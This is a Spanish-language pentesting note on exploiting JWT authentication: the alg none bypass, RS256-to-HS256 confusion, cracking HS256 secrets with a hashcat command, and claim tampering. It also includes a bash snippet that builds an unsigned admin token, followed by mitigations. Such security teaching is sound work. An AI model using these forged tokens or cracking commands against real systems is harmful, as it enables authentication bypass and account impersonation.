
---
Tags: #web #jwt #pentesting #jwt-exploitation #auth-bypass #none-alg #token-hijacking #owasp

---
## 📖 Definición

Un **JSON Web Token (JWT)** es un estándar abierto (RFC 7519) que define una forma compacta y segura de transmitir información entre dos partes.  
Se utiliza habitualmente para **autenticación y autorización** en aplicaciones web y APIs.

Un JWT consta de **3 partes** separadas por puntos:

`header.payload.signature`

- **Header** → Algoritmo de firma (ej: HS256, RS256, none).
    
- **Payload** → Datos (claims: sub, exp, role, etc.).
    
- **Signature** → Garantiza la integridad y autenticidad.
    

---

## 🔍 Enumeración de JWT

Al obtener un JWT (normalmente en una cookie o en la cabecera HTTP `Authorization: Bearer <token>`), se deben analizar:

### 🔹 Métodos

- Usar **jwt.io** para decodificar el token y revisar:
    
    - Algoritmo (`alg`)
        
    - Claims (`sub`, `role`, `admin`, `exp`, etc.)
        
- Probar algoritmos soportados: HS256, RS256, none.
    
- Revisar si se utiliza **clave débil** (ejemplo: `secret`, `password`).
    
- Intentar modificar claims sensibles (`role: user → admin`).
    

### 🔹 Herramientas

- `jwt.io` → decodificación manual.
    
- `jwt_tool` (Python).
    
- `jwt-cracker`, `hashcat` → fuerza bruta de claves secretas HS256.
    
- Burp Suite + extensión **JWT Editor**.
    

---

## 🎯 Métodos de Explotación

### 1. **Algoritmo none**

Algunos servidores aceptan `alg: none`, lo que **elimina la firma**.  
Un atacante puede manipular el payload y enviar un token sin firma.

#### Ejemplo

`{   "alg": "none",   "typ": "JWT" }`

Payload:

`{   "sub": "victim",   "role": "admin" }`

Token resultante (sin firma):

`header.payload.`

⚡ Si la aplicación no valida la firma, aceptará el token como válido.

---

### 2. **Cambio de Algoritmo (RS256 → HS256)**

Algunas implementaciones permiten **cambiar RS256 (clave pública/privada)** por HS256 (clave simétrica).  
Un atacante puede usar la **clave pública como clave secreta** en HS256 y firmar tokens válidos.

---

### 3. **Fuerza bruta del secret (HS256)**

Si el JWT usa **HS256 con clave débil**, se puede crackear con `hashcat` o `jwt-cracker`.

Ejemplo con `hashcat`:

`hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt`

---

### 4. **Manipulación de Claims**

- Cambiar `"role": "user"` → `"role": "admin"`.
    
- Cambiar `"exp": 9999999999` para eliminar la expiración.
    

---

### 5. **Creación manual de un JWT**

Puedes crear un JWT manualmente con `echo -n` y `base64`.

Ejemplo:

```bash
# Header (alg none) 
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-' > header.b64
 
# Payload (con role admin) 
echo -n '{"sub":"attacker","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-' > payload.b64  

# Montamos el JWT 
cat header.b64; echo -n "."; cat payload.b64; echo -n "."

# Resultado:

<HEADER_B64>.<PAYLOAD_B64>.
```

Este JWT puede ser probado en la aplicación si no valida la firma.

---

## 🛡️ Medidas de Mitigación

- **No permitir `alg:none`**.
    
- Usar algoritmos seguros como **RS256**.
    
- **Rotar y proteger claves privadas**.
    
- Validar siempre la firma del JWT.
    
- Revisar expiración (`exp`) y no permitir tokens infinitos.
    
- Usar librerías seguras para parsing de JWT.
    

---

## 🚨 Impacto

- **Bypass de autenticación**.
    
- **Escalada de privilegios** (ej: user → admin).
    
- **Suplantación de identidad**.
    
- **Acceso a datos sensibles de APIs**.
    

---
